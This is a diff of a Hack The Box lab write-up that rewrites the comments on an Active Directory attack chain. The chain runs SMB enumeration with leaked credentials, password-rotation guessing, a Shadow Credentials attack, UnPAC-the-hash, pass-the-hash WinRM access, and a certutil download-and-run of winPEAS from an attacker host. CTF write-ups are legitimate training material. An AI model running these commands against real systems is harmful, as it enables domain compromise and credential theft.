@@ -58,8 +58,8 @@ Administrator (pending)
 ### Port Discovery
 ```bash
 export TARGET=10.129.41.161
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: full TCP port scan with fast rate.
+# Why here: discover all open services on the DC and the secondary WSUS port.
 nmap -sS -p- --min-rate 5000 -n $TARGET
 nmap -sVC -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8530 $TARGET -oA service-scan
 ```
@@ -72,8 +72,8 @@ Standard DC footprint + `8530` (WSUS, hinting at `wsus.logging.htb`).
 
 ### Hosts file
 ```bash
-# What it does: adds machine domains to /etc/hosts.
-# Why here: resolve virtual hosts during web enumeration.
+# What it does: update the local hosts file with the discovered domain names.
+# Why here: enable domain-based resolution for Kerberos and web services.
 echo "$TARGET logging.htb DC01.logging.htb wsus.logging.htb" | sudo tee -a /etc/hosts
 ```
 
@@ -82,8 +82,8 @@ echo "$TARGET logging.htb DC01.logging.htb wsus.logging.htb" | sudo tee -a /etc/
 Any Kerberos operation (TGT request, AS-REP, GetUserSPNs, getnthash) requires the clock to be within 5 minutes of the DC.
 
 ```bash
-# What it does: adjusts or synchronizes local time with the target/DC.
-# Why here: avoid Kerberos failures due to time skew.
+# What it does: sync the attacker's clock with the Domain Controller.
+# Why here: prevent Kerberos authentication failures caused by time drift beyond 5 minutes.
 sudo timedatectl set-ntp false
 sudo ntpdate -u $TARGET
 ```
@@ -94,8 +94,8 @@ sudo ntpdate -u $TARGET
 
 ### List shares
 ```bash
-# What it does: enumerates or authenticates against Windows/AD services.
-# Why here: validar acceso, shares, usuarios o politicas.
+# What it does: check SMB share permissions using Wallace's credentials.
+# Why here: identify non-standard shares that might contain sensitive data.
 crackmapexec smb $TARGET --shares -u 'wallace.everette' -p 'Welcome2026@'
 ```
 
@@ -103,15 +103,15 @@ Standard AD shares plus a **`Logs`** custom share  always interesting on HTB.
 
 ### Walk NETLOGON (baseline)
 ```bash
-# What it does: connects to an SMB resource and optionally executes an action.
-# Why here: listar, descargar o subir archivos por SMB.
+# What it does: recursively list the NETLOGON share.
+# Why here: check for scripts or configuration files that might contain credentials.
 smbclient //$TARGET/NETLOGON -U wallace.everette%'Welcome2026@' -c 'recurse;ls'
 ```
 
 ### Dump the Logs share
 ```bash
-# What it does: connects to an SMB resource and optionally executes an action.
-# Why here: listar, descargar o subir archivos por SMB.
+# What it does: list and download files from the custom Logs share.
+# Why here: recover the application log files for offline analysis.
 smbclient //$TARGET/Logs -U wallace.everette%'Welcome2026@' -c 'recurse;ls'
 smbclient //$TARGET/Logs -U wallace.everette%'Welcome2026@'
 ```
@@ -137,8 +137,8 @@ Two service accounts are implied: `svc_recovery` and  via the share naming  
 
 ### Test leaked creds
 ```bash
-# What it does: enumerates or authenticates against Windows/AD services.
-# Why here: validar acceso, shares, usuarios o politicas.
+# What it does: validate the leaked svc_recovery credentials.
+# Why here: confirm if the discovered password is still active or requires rotation.
 crackmapexec smb $TARGET -u 'svc_recovery' -p 'Em3rg3ncyPa$$2025'
 ```
 
@@ -146,8 +146,8 @@ crackmapexec smb $TARGET -u 'svc_recovery' -p 'Em3rg3ncyPa$$2025'
 
 ### Try next year in the rotation
 ```bash
-# What it does: executes an Impacket utility for AD/Windows.
-# Why here: extract tickets, hashes or protocol access for the chain.
+# What it does: request a Kerberos TGT using the guessed password.
+# Why here: obtain a valid ticket for svc_recovery by predicting the year-based rotation.
 impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026'
 ```
 
@@ -190,8 +190,8 @@ The DC runs Windows 2016+ and supports PKINIT, so **Shadow Credentials is the cl
 
 ### User enumeration (context)
 ```bash
-# What it does: enumerates or authenticates against Windows/AD services.
-# Why here: validar acceso, shares, usuarios o politicas.
+# What it does: enumerate all domain users.
+# Why here: identify potential targets for ACL abuse or password spraying.
 crackmapexec smb $TARGET -u 'wallace.everette' -p 'Welcome2026@' --users
 rpcclient -U "logging.htb/wallace.everette%Welcome2026@" $TARGET -c "enumdomusers"
 ```
@@ -217,8 +217,8 @@ With `svc_recovery`'s TGT in the environment:
 ```bash
 export KRB5CCNAME=$(pwd)/svc_recovery.ccache
 
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: run pywhisker to perform a Shadow Credentials attack.
+# Why here: write a new key to the msa_health$ computer object to enable certificate-based auth.
 python3 pywhisker/pywhisker.py \
   -d "logging.htb" \
   -u "svc_recovery" --no-pass -k \
@@ -242,8 +242,8 @@ The `msDS-KeyCredentialLink` property on `MSA_HEALTH$` now contains our public k
 ### Request a TGT with the certificate
 
 ```bash
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: request a TGT using the generated PFX certificate.
+# Why here: authenticate as msa_health$ via PKINIT to start the credential extraction process.
 python3 gettgtpkinit.py \
   -cert-pfx ../pywhisker/t9VbfvhY.pfx \
   -pfx-pass 'Z7teStyyJxhoRZR6tGDd' \
@@ -265,8 +265,8 @@ export KRB5CCNAME=$(pwd)/msa_health.ccache
 ### UnPAC the hash
 
 ```bash
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: extract the account's NT hash from the PAC.
+# Why here: obtain a reusable NTLM hash for msa_health$ to establish a shell foothold.
 python3 getnthash.py \
   -key 'b0fed55e745ae9ffbba885d0cd7db34a16fb565a26ca1967c90b3968a7b7f0a6' \
   -dc-ip $TARGET logging.htb/msa_health\$
@@ -284,8 +284,8 @@ NT Hash: 603fc24ee01a9409f83c9d1d701485c5
 ## WinRM Foothold as msa_health$
 
 ```bash
-# What it does: opens a WinRM shell with the specified credentials/hash.
-# Why here: obtain interactive Windows access after validating credentials.
+# What it does: log in via WinRM using the extracted NT hash.
+# Why here: establish the first interactive session on the DC.
 evil-winrm -i $TARGET -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
 ```
 
@@ -303,15 +303,15 @@ logging\msa_health$
 
 Host the payload locally:
 ```bash
-# What it does: starts a temporary HTTP server from the current directory.
-# Why here: serve payloads or files between attacker and victim.
+# What it does: host the winPEAS script on the attacker machine.
+# Why here: facilitate the transfer of enumeration tools to the target.
 sudo python3 -m http.server 80
 ```
 
 From the shell (Meterpreter isn't available here  use `certutil` or `iwr`):
 ```powershell
-# What it does: executes a Windows command line action.
-# Why here: enumerate, transfer, replace or validate artifacts on the victim.
+# What it does: download winPEAS and execute it to find escalation paths.
+# Why here: automate the search for misconfigurations on the local system.
 certutil -urlcache -f http://<ATTACKER_IP>:80/winPEAS.ps1 winPEAS.ps1
 .\winPEAS.ps1 > resultados.txt 2>&1
 ```
